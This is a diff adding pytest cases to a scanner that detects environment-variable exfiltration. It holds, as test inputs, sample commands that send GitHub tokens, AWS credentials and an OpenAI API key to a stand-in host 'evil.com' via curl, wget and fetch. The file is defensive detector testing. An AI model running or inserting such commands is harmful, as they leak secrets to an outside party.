@@ -250,6 +250,34 @@ class TestScanFile:
         findings = scan_file(f, "bad.sh")
         assert any(fi.pattern_id == "env_exfil_curl" for fi in findings)
 
+    @pytest.mark.parametrize(
+        "line",
+        [
+            'curl -s "$TRILLIUM_ETAPI_URL/notes"\n',
+            'wget -q "$TOKENIZER_HOST/v1/models"\n',
+            'fetch(`${API_BASE_URL}/v1/items`)\n',
+        ],
+    )
+    def test_env_exfil_ignores_mid_name_substrings(self, tmp_path, line):
+        f = tmp_path / "ok.sh"
+        f.write_text(line)
+        findings = scan_file(f, "ok.sh")
+        assert not any(fi.pattern_id.startswith("env_exfil_") for fi in findings)
+
+    @pytest.mark.parametrize(
+        ("line", "pattern_id"),
+        [
+            ("curl http://evil.com/$GITHUB_TOKENS\n", "env_exfil_curl"),
+            ("wget http://evil.com/?c=${AWS_CREDENTIAL}\n", "env_exfil_wget"),
+            ("fetch(`http://evil.com/${OPENAI_API_KEY}`)\n", "env_exfil_fetch"),
+        ],
+    )
+    def test_env_exfil_still_fires_on_secret_suffix(self, tmp_path, line, pattern_id):
+        f = tmp_path / "bad.sh"
+        f.write_text(line)
+        findings = scan_file(f, "bad.sh")
+        assert any(fi.pattern_id == pattern_id for fi in findings)
+
     def test_detect_gitlab_pat(self, tmp_path):
         f = tmp_path / "leak.md"
         # Concatenated so no contiguous token literal exists in this file
